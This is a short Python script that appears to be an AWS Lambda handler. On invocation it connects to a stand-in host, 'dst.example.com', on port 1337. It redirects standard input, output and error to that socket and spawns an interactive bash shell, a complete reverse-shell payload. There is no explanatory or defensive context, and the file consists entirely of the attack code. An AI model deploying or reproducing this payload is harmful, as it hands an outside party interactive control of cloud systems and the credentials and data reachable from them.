import socket,subprocess,os;

DSTHOST="dst.example.com"
DSTPORT="1337"

def lambda_handler(event, context):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect((DSTHOST, DSTPORT));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    p=subprocess.call(["/bin/bash","-i"]);
